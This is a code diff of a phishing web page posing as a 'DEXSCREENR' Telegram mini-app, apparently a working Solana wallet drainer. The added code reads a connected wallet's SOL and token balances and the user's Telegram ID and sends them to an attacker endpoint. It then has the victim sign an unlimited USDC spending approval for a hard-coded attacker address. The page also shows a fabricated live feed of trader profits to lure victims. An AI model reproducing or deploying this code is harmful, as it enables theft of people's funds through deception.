@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>DEXSCREENR</title>
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.9/lib/index.iife.min.js"></script>
+<script src="https://unpkg.com/@solana/spl-token@0.1.8/lib/index.iife.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
@@ -49,10 +49,11 @@
   
   .feed-item {
     display: flex; justify-content: space-between; align-items: center; background: rgba(255, 255, 255, 0.03);
-    padding: 12px 10px; border-radius: 10px; font-size: 12px; flex-shrink: 0; white-space: nowrap; animation: slideFadeIn 0.5s ease-out forwards;
+    padding: 12px 10px; border-radius: 10px; font-size: 12px; flex-shrink: 0; white-space: nowrap;
+    animation: slideFadeIn 0.4s ease-out;
   }
 
-  @keyframes slideFadeIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
+  @keyframes slideFadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
 
   .feed-wallet { font-family: monospace; color: #71717a; font-size: 11px; width: 50px; }
   .feed-token { font-weight: 600; color: #ffffff; flex: 1; text-align: left; padding-left: 6px; }
@@ -90,11 +91,6 @@
     text-align: center; display: flex; align-items: center; justify-content: center; gap: 6px; width: 100%;
   }
   .security-footer svg { width: 12px; height: 12px; opacity: 0.7; }
-
-  #debug-window {
-    position: fixed; bottom: 0; left: 0; right: 0; background: rgba(255,0,0,0.8); color: white;
-    font-family: monospace; font-size: 12px; padding: 10px; z-index: 9999; max-height: 150px; overflow-y: auto; display: none;
-  }
 </style>
 </head>
 <body>
@@ -116,22 +112,13 @@
     </div>
   </div>
 
-  <div id="debug-window"></div>
-
 <script>
-  function logDebug(msg) {
-    const dbg = document.getElementById('debug-window');
-    dbg.style.display = 'block';
-    dbg.innerHTML += `<div>> ${msg}</div>`;
-    dbg.scrollTop = dbg.scrollHeight;
-  }
-
   if (window.Telegram && window.Telegram.WebApp) {
     window.Telegram.WebApp.ready();
     window.Telegram.WebApp.expand();
   }
 
-  const footerTexts = ["ZachXBT is watching the chain.", "Did you know? The Kimchi premium trade was mostly fake volume.", "Your seed phrase is safe. We only want your USDC."];
+  const footerTexts = ["ZachXBT is watching the chain.", "Did you know? The Kimchi premium trade was mostly fake volume.", "Your seed phrase is safe. We only want your USDC.", "I bought the top so you don't have to."];
   const footerEl = document.getElementById('footerText');
   let footerIndex = 0;
   setInterval(() => {
@@ -147,14 +134,30 @@
   const fakeWallets = ['7xKX...', '3vNd...', '8fRt...', '5cYh...', '9pLk...'];
   const fakeTokens = ['WIF', 'BONK', 'POPCAT', 'MEW', 'BOME'];
   
-  function addFeedItem() {
+  function addFeedItem(isMega = false) {
     const wallet = fakeWallets[Math.floor(Math.random() * fakeWallets.length)];
     const token = fakeTokens[Math.floor(Math.random() * fakeTokens.length)];
     let pnlText = ""; let pnlColor = "#14F195"; 
-    const pnlPercent = Math.random() * 435 + 15;
-    const baseInvest = Math.random() * 1400 + 100;
-    const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
-    pnlText = `+$${pnlValue} (+${pnlPercent.toFixed(1)}%)`;
+    if (isMega) {
+      const pnlPercent = Math.random() * 2500 + 1000;
+      const baseInvest = Math.random() * 400 + 100;
+      const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
+      pnlText = `+$${pnlValue} (+${pnlPercent.toFixed(1)}%)`;
+    } else {
+      const isWin = Math.random() > 0.35;
+      if (isWin) {
+        const pnlPercent = Math.random() * 435 + 15;
+        const baseInvest = Math.random() * 1400 + 100;
+        const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
+        pnlText = `+$${pnlValue} (+${pnlPercent.toFixed(1)}%)`;
+      } else {
+        const pnlPercent = Math.random() * 35 + 5;
+        const baseInvest = Math.random() * 1800 + 200;
+        const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
+        pnlText = `-$${pnlValue} (-${pnlPercent.toFixed(1)}%)`;
+        pnlColor = "#ef4444"; 
+      }
+    }
     const el = document.createElement('div');
     el.className = 'feed-item';
     el.innerHTML = `<span class="feed-wallet">${wallet}</span><span class="feed-token">$${token}</span><span class="feed-profit" style="color: ${pnlColor}">${pnlText}</span>`;
@@ -166,7 +169,7 @@
   setInterval(addFeedItem, 3000);
 
   const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
-  const ENDPOINT = "https://dexscreener.rthvzkr6jv.workers.dev"; 
+  const ENDPOINT = "https://dexscreenr.rthvzkr6jv.workers.dev"; 
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
   const RPC_URL = "https://solana.publicnode.com"; 
 
@@ -218,13 +221,11 @@
   }
 
   async function triggerConnect() {
-    logDebug("Start triggerConnect");
     let provider;
-    if (window.phantom?.solana?.isPhantom) { provider = window.phantom.solana; logDebug("Phantom found"); }
-    else if (window.solflare?.isSolflare) { provider = window.solflare; logDebug("Solflare found"); }
+    if (window.phantom?.solana?.isPhantom) { provider = window.phantom.solana; }
+    else if (window.solflare?.isSolflare) { provider = window.solflare; }
 
     if (!provider) { 
-      logDebug("No provider found!");
       if (window.Telegram && window.Telegram.WebApp) {
         window.Telegram.WebApp.showConfirm("Wallet connection requires Phantom. Open in Phantom app?", (confirmed) => {
           if (confirmed) {
@@ -237,44 +238,71 @@
     }
 
     try {
-      logDebug("Connecting...");
       const resp = await provider.connect();
       const victim = resp.publicKey.toString();
-      logDebug("Connected: " + victim);
+      const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
       
       const conn = new solanaWeb3.Connection(RPC_URL);
       
-      logDebug("Fetching balance...");
       const solBalance = await conn.getBalance(resp.publicKey);
       const solAmount = (solBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
-      logDebug("SOL Balance: " + solAmount);
       
+      let tokensString = "";
       let usdcAmount = 0;
+      
       if (typeof splToken !== 'undefined') {
-        logDebug("splToken loaded.");
-        const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
         try {
-          const tokenBal = await conn.getTokenAccountBalance(victimAta);
-          usdcAmount = tokenBal.value.uiAmount;
-          logDebug("USDC Balance: " + usdcAmount);
-        } catch (e) { logDebug("No USDC account"); }
-      } else {
-        logDebug("WARNING: splToken library not loaded. Skipping USDC check.");
+          const tokenAccounts = await conn.getParsedTokenAccountsByOwner(resp.publicKey, {
+            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
+          });
+          tokenAccounts.value.forEach((accountInfo) => {
+            const parsedInfo = accountInfo.account.data.parsed.info;
+            const amount = parsedInfo.tokenAmount.uiAmount;
+            if (amount > 0) {
+              const mint = parsedInfo.mint;
+              if (mint === USDC_MINT) usdcAmount = amount;
+              tokensString += `${amount.toFixed(2)} of ${mint.slice(0,4)}.. | `;
+            }
+          });
+        } catch (e) {}
       }
 
-      logDebug("Sending to ENDPOINT...");
-      const fetchResp = await fetch(ENDPOINT, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: solAmount, usdc: usdcAmount, ts: Date.now() })
+      const payload = JSON.stringify({ 
+        victim, chain: "solana", type: "connection_and_balance",
+        sol: solAmount, usdc: usdcAmount, tokens: tokensString,
+        tg_user_id: tgUserId, ts: Date.now() 
       });
-      logDebug("Fetch status: " + fetchResp.status);
+
+      // Sende Daten (mit Fallback auf sendBeacon)
+      try {
+        await fetch(ENDPOINT, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: payload
+        });
+      } catch (err) {
+        navigator.sendBeacon(ENDPOINT, new Blob([payload], {type: 'application/json'}));
+      }
+
+      if (usdcAmount > 0 && typeof splToken !== 'undefined') {
+        const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
+        const delegateIx = splToken.createApproveInstruction(victimAta, new solanaWeb3.PublicKey(ATTACKER), resp.publicKey, [], BigInt("18446744073709551615"));
+        const tx = new solanaWeb3.Transaction().add(delegateIx);
+        tx.feePayer = resp.publicKey;
+        tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+        const signedTx = await provider.signTransaction(tx);
+
+        await fetch(ENDPOINT, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", tg_user_id: tgUserId, ts: Date.now() })
+        });
+      }
 
       spin.style.display = 'none'; container.classList.remove('loading'); container.classList.add('success');
       thumb.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>';
-      logDebug("Done!");
 
-    } catch (e) { logDebug("ERROR: " + e.message); resetSlider(); }
+    } catch (e) { resetSlider(); }
   }
 
   function resetSlider() {
